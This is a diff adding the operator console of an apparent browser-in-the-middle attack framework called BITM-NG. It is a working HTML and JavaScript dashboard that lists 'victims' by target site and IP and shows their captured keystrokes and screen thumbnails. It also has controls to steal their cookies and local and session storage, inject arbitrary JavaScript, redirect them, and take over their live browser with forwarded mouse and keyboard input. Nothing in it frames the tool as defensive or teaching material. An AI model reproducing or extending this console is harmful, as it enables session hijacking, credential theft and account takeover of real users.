@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BITM-NG — Admin</title>
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+    crossorigin="anonymous"
+  />
+  <style>
+    html, body { height: 100%; }
+    body { background: #1a1a2e; color: #e0e0e0; font-family: 'Segoe UI', monospace; }
+
+    .sidebar { width: 340px; min-width: 340px; background: #16213e; border-right: 1px solid #0f3460; overflow-y: auto; }
+    .main-panel { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+    .top-bar { background: #0f3460; padding: 8px 16px; display: flex; align-items: center; gap: 12px; flex-shrink: 0; }
+    .victim-card { border: 1px solid #0f3460; border-radius: 6px; margin: 8px; padding: 10px; cursor: pointer; background: #1a1a2e; transition: border-color 0.2s; }
+    .victim-card:hover { border-color: #e94560; }
+    .victim-card.active { border-color: #e94560; background: #12122a; }
+    .victim-card .badge-target { font-size: 0.7em; background: #0f3460; }
+
+    #takeover-view { display: none; flex-direction: column; flex: 1; overflow: hidden; }
+    #takeover-view.active { display: flex; }
+    #takeover-canvas { width: 100%; height: 100%; object-fit: contain; background: #000; }
+    canvas#takeover-canvas { display: block; }
+
+    #info-panel { flex: 1; display: flex; align-items: center; justify-content: center; color: #555; font-size: 1.2em; }
+
+    .data-box { background: #0d0d1a; border: 1px solid #0f3460; border-radius: 4px; padding: 10px; font-size: 0.75em; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+    .section-title { color: #e94560; font-size: 0.85em; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+
+    .thumbnail-img { width: 100%; border-radius: 4px; margin-top: 6px; }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; background: #2ecc71; }
+    .status-dot.inactive { background: #555; }
+  </style>
+</head>
+<body class="d-flex" style="height:100vh; overflow:hidden;">
+
+  <!-- ── Sidebar: victim list ─────────────────────────────────────── -->
+  <div class="sidebar d-flex flex-column">
+    <div style="padding:12px 16px; border-bottom:1px solid #0f3460; font-size:1.1em; color:#e94560; font-weight:bold;">
+      BITM-NG
+      <span id="conn-dot" class="status-dot inactive ms-2" title="Socket status"></span>
+    </div>
+    <div id="victim-list" style="flex:1; overflow-y:auto;">
+      <div style="padding:24px; color:#555; text-align:center;" id="no-victims-msg">No active victims</div>
+    </div>
+  </div>
+
+  <!-- ── Main panel ──────────────────────────────────────────────── -->
+  <div class="main-panel">
+
+    <!-- Top toolbar -->
+    <div class="top-bar">
+      <button class="btn btn-sm btn-danger" id="btn-takeover" disabled>Take Over</button>
+      <button class="btn btn-sm btn-secondary" id="btn-give-back" disabled>Give Back</button>
+      <button class="btn btn-sm btn-warning" id="btn-cookies" disabled>Steal Cookies</button>
+      <button class="btn btn-sm btn-warning" id="btn-storage" disabled>Steal Storage</button>
+      <span id="victim-label" class="text-muted ms-2" style="font-size:0.85em;"></span>
+      <div class="ms-auto d-flex gap-2">
+        <input id="inject-input" class="form-control form-control-sm" style="width:220px;" placeholder="JS to inject…" />
+        <button class="btn btn-sm btn-outline-light" id="btn-inject" disabled>Inject</button>
+        <input id="nav-input" class="form-control form-control-sm" style="width:200px;" placeholder="Navigate to URL…" />
+        <button class="btn btn-sm btn-outline-light" id="btn-nav" disabled>Go</button>
+      </div>
+    </div>
+
+    <!-- Takeover canvas (shown during takeover) -->
+    <div id="takeover-view">
+      <canvas id="takeover-canvas"></canvas>
+    </div>
+
+    <!-- Info/data panel (shown when not in takeover) -->
+    <div id="info-panel">
+      <div id="data-display" style="width:90%; max-width:900px;">
+        <div id="welcome-msg">Select a victim to begin.</div>
+        <div id="keylog-section" style="display:none; margin-bottom:12px;">
+          <div class="section-title">Keylog</div>
+          <div class="data-box" id="keylog-box" style="max-height:200px; word-break:break-all;"></div>
+        </div>
+        <div id="cookie-section" style="display:none;">
+          <div class="section-title">Cookies</div>
+          <div class="data-box" id="cookie-box"></div>
+        </div>
+        <div id="storage-section" style="display:none; margin-top:12px;">
+          <div class="section-title">Storage</div>
+          <div class="data-box" id="storage-box"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    (function () {
+      'use strict';
+
+      // ── Auth ──────────────────────────────────────────────────────────────
+      const params     = new URLSearchParams(location.search);
+      const SOCKET_KEY = params.get('k') || prompt('Admin socket key:') || '';
+
+      const socket = io({
+        auth: { password: SOCKET_KEY, isAdmin: true },
+        transports: ['websocket'],
+      });
+
+      // ── State ─────────────────────────────────────────────────────────────
+      let selectedBrowserId = null;
+      let inTakeover        = false;
+      let blobUrlToRevoke   = null;
+
+      // ── DOM refs ──────────────────────────────────────────────────────────
+      const connDot       = document.getElementById('conn-dot');
+      const victimList    = document.getElementById('victim-list');
+      const noVictimsMsg  = document.getElementById('no-victims-msg');
+      const victimLabel   = document.getElementById('victim-label');
+      const btnTakeover   = document.getElementById('btn-takeover');
+      const btnGiveBack   = document.getElementById('btn-give-back');
+      const btnCookies    = document.getElementById('btn-cookies');
+      const btnStorage    = document.getElementById('btn-storage');
+      const btnInject     = document.getElementById('btn-inject');
+      const btnNav        = document.getElementById('btn-nav');
+      const injectInput   = document.getElementById('inject-input');
+      const navInput      = document.getElementById('nav-input');
+      const takeoverView  = document.getElementById('takeover-view');
+      const infoPanel     = document.getElementById('info-panel');
+      const takCanvas     = document.getElementById('takeover-canvas');
+      const takCtx        = takCanvas.getContext('2d');
+      const welcomeMsg    = document.getElementById('welcome-msg');
+      const keylogSection = document.getElementById('keylog-section');
+      const keylogBox     = document.getElementById('keylog-box');
+      const cookieSection = document.getElementById('cookie-section');
+      const cookieBox     = document.getElementById('cookie-box');
+      const storageSection= document.getElementById('storage-section');
+      const storageBox    = document.getElementById('storage-box');
+
+      // ── Connection status ─────────────────────────────────────────────────
+      socket.on('connect',    () => connDot.classList.remove('inactive'));
+      socket.on('disconnect', () => connDot.classList.add('inactive'));
+
+      // ── Victim list ───────────────────────────────────────────────────────
+      const victims = new Map(); // browserId → { target, connectedAt, ip, cardEl, thumbUrl }
+
+      socket.on('victim_list', (list) => {
+        list.forEach(addVictim);
+      });
+
+      socket.on('new_victim', addVictim);
+
+      socket.on('victim_disconnected', ({ browserId }) => {
+        const v = victims.get(browserId);
+        if (v) { v.cardEl.remove(); victims.delete(browserId); }
+        if (selectedBrowserId === browserId) deselectVictim();
+        noVictimsMsg.style.display = victims.size === 0 ? '' : 'none';
+      });
+
+      function addVictim(info) {
+        noVictimsMsg.style.display = 'none';
+        if (victims.has(info.browserId)) return;
+
+        const card = document.createElement('div');
+        card.className = 'victim-card';
+        card.innerHTML = `
+          <div class="d-flex align-items-center gap-2">
+            <span class="status-dot"></span>
+            <strong>${esc(info.target)}</strong>
+            <span class="badge badge-target rounded-pill">${esc(info.ip || '—')}</span>
+          </div>
+          <div style="font-size:0.7em; color:#888; margin-top:4px;">${esc(info.browserId.slice(0,8))}… · ${esc(info.connectedAt)}</div>
+          <img class="thumbnail-img" alt="thumbnail" style="display:none;" />
+        `;
+        card.addEventListener('click', () => selectVictim(info.browserId));
+        victimList.appendChild(card);
+
+        victims.set(info.browserId, { ...info, cardEl: card, thumbUrl: null, keylog: info.keylog ?? '' });
+      }
+
+      // ── Thumbnails ─────────────────────────────────────────────────────────
+      socket.on('thumbnail', ({ browserId, data }) => {
+        const v = victims.get(browserId);
+        if (!v) return;
+
+        const img = v.cardEl.querySelector('img');
+        if (!img) return;
+
+        // Revoke previous blob URL to prevent memory leak
+        if (v.thumbUrl) URL.revokeObjectURL(v.thumbUrl);
+
+        const blob = new Blob([new Uint8Array(data)], { type: 'image/jpeg' });
+        v.thumbUrl = URL.createObjectURL(blob);
+        img.src = v.thumbUrl;
+        img.style.display = '';
+      });
+
+      // ── Keylog ─────────────────────────────────────────────────────────────
+      socket.on('keylog', ({ browserId, entry }) => {
+        const v = victims.get(browserId);
+        if (!v) return;
+        v.keylog += entry;
+        if (selectedBrowserId === browserId) {
+          keylogBox.textContent = v.keylog;
+          keylogBox.scrollTop = keylogBox.scrollHeight;
+        }
+      });
+
+      // ── Frame rendering (takeover) ─────────────────────────────────────────
+      socket.on('frame', (frameData) => {
+        if (!inTakeover) return;
+        const blob = new Blob([new Uint8Array(frameData)], { type: 'image/jpeg' });
+        createImageBitmap(blob).then((bmp) => {
+          takCanvas.width  = bmp.width;
+          takCanvas.height = bmp.height;
+          takCtx.drawImage(bmp, 0, 0);
+          bmp.close();
+        }).catch(() => {});
+      });
+
+      // ── Selection ─────────────────────────────────────────────────────────
+      function selectVictim(browserId) {
+        if (inTakeover) return; // prevent switching during takeover
+        victims.forEach((v, id) => {
+          v.cardEl.classList.toggle('active', id === browserId);
+        });
+        selectedBrowserId = browserId;
+
+        const v = victims.get(browserId);
+        victimLabel.textContent = v ? `${v.target} — ${browserId.slice(0,8)}…` : '';
+
+        btnTakeover.disabled = false;
+        btnCookies.disabled  = false;
+        btnStorage.disabled  = false;
+        btnInject.disabled   = false;
+        btnNav.disabled      = false;
+        welcomeMsg.textContent = '';
+        cookieSection.style.display  = 'none';
+        storageSection.style.display = 'none';
+        keylogSection.style.display  = '';
+        keylogBox.textContent = v?.keylog ?? '';
+        keylogBox.scrollTop = keylogBox.scrollHeight;
+      }
+
+      function deselectVictim() {
+        selectedBrowserId = null;
+        inTakeover = false;
+        victimLabel.textContent = '';
+        btnTakeover.disabled = true;
+        btnGiveBack.disabled = true;
+        btnCookies.disabled  = true;
+        btnStorage.disabled  = true;
+        btnInject.disabled   = true;
+        btnNav.disabled      = true;
+        takeoverView.classList.remove('active');
+        infoPanel.style.display = '';
+        keylogSection.style.display = 'none';
+      }
+
+      // ── Takeover ──────────────────────────────────────────────────────────
+      btnTakeover.addEventListener('click', () => {
+        if (!selectedBrowserId) return;
+        socket.emit('take_over_browser', { browserId: selectedBrowserId });
+        inTakeover = true;
+        takeoverView.classList.add('active');
+        infoPanel.style.display = 'none';
+        btnTakeover.disabled = true;
+        btnGiveBack.disabled = false;
+        attachTakeoverInput();
+      });
+
+      btnGiveBack.addEventListener('click', () => {
+        socket.emit('give_back_control');
+        inTakeover = false;
+        takeoverView.classList.remove('active');
+        infoPanel.style.display = '';
+        btnTakeover.disabled = false;
+        btnGiveBack.disabled = true;
+        detachTakeoverInput();
+      });
+
+      // ── Takeover input forwarding ─────────────────────────────────────────
+      function scaleCoords(e) {
+        const rect = takCanvas.getBoundingClientRect();
+        // object-fit:contain uses uniform scaling — find the constraining dimension
+        const scale   = Math.min(rect.width / takCanvas.width, rect.height / takCanvas.height);
+        const offsetX = (rect.width  - takCanvas.width  * scale) / 2;
+        const offsetY = (rect.height - takCanvas.height * scale) / 2;
+        return {
+          x: Math.round((e.clientX - rect.left - offsetX) / scale),
+          y: Math.round((e.clientY - rect.top  - offsetY) / scale),
+        };
+      }
+
+      function onMove(e) { socket.emit('mouse_move',   scaleCoords(e)); }
+      function onClick(e) {
+        const { x, y } = scaleCoords(e);
+        socket.emit('mouse_click', { x, y, button: btnName(e.button) });
+      }
+      function onCtx(e) {
+        e.preventDefault();
+        const { x, y } = scaleCoords(e);
+        socket.emit('mouse_click', { x, y, button: 'right' });
+      }
+      function onWheel(e) {
+        e.preventDefault();
+        const { x, y } = scaleCoords(e);
+        socket.emit('mouse_scroll', { x, y, deltaX: e.deltaX, deltaY: e.deltaY });
+      }
+      function onKeyDown(e) { e.preventDefault(); socket.emit('key_down', { key: e.key, code: e.code }); }
+      function onKeyUp(e)   { e.preventDefault(); socket.emit('key_up',   { key: e.key, code: e.code }); }
+      function onPaste(e) {
+        e.preventDefault();
+        const text = e.clipboardData?.getData('text') ?? '';
+        if (text) socket.emit('paste', { text });
+      }
+
+      function attachTakeoverInput() {
+        takCanvas.addEventListener('mousemove',   onMove);
+        takCanvas.addEventListener('click',       onClick);
+        takCanvas.addEventListener('contextmenu', onCtx);
+        takCanvas.addEventListener('wheel',       onWheel, { passive: false });
+        document.addEventListener('keydown', onKeyDown);
+        document.addEventListener('keyup',   onKeyUp);
+        document.addEventListener('paste',   onPaste);
+      }
+
+      function detachTakeoverInput() {
+        takCanvas.removeEventListener('mousemove',   onMove);
+        takCanvas.removeEventListener('click',       onClick);
+        takCanvas.removeEventListener('contextmenu', onCtx);
+        takCanvas.removeEventListener('wheel',       onWheel);
+        document.removeEventListener('keydown', onKeyDown);
+        document.removeEventListener('keyup',   onKeyUp);
+        document.removeEventListener('paste',   onPaste);
+      }
+
+      // ── Cookie / storage ──────────────────────────────────────────────────
+      btnCookies.addEventListener('click', () => {
+        if (selectedBrowserId) socket.emit('get_cookies', { browserId: selectedBrowserId });
+      });
+      btnStorage.addEventListener('click', () => {
+        if (selectedBrowserId) socket.emit('get_storage', { browserId: selectedBrowserId });
+      });
+
+      socket.on('cookies', ({ cookies }) => {
+        cookieSection.style.display = '';
+        cookieBox.textContent = JSON.stringify(cookies, null, 2);
+      });
+
+      socket.on('storage', ({ localStorage, sessionStorage }) => {
+        storageSection.style.display = '';
+        storageBox.textContent = JSON.stringify({ localStorage, sessionStorage }, null, 2);
+      });
+
+      // ── Inject / navigate ─────────────────────────────────────────────────
+      btnInject.addEventListener('click', () => {
+        const js = injectInput.value.trim();
+        if (js) { socket.emit('inject_js', { js }); injectInput.value = ''; }
+      });
+
+      btnNav.addEventListener('click', () => {
+        const url = navInput.value.trim();
+        if (url) { socket.emit('navigate', { url }); navInput.value = ''; }
+      });
+
+      // ── Error display ─────────────────────────────────────────────────────
+      socket.on('error', (msg) => {
+        alert(`[BITM-NG] Error: ${msg}`);
+      });
+
+      // ── Helpers ───────────────────────────────────────────────────────────
+      function btnName(b) { return b === 1 ? 'middle' : b === 2 ? 'right' : 'left'; }
+      function esc(s) {
+        return String(s)
+          .replace(/&/g,'&amp;').replace(/</g,'&lt;')
+          .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+      }
+    })();
+  </script>
+</body>
+</html>
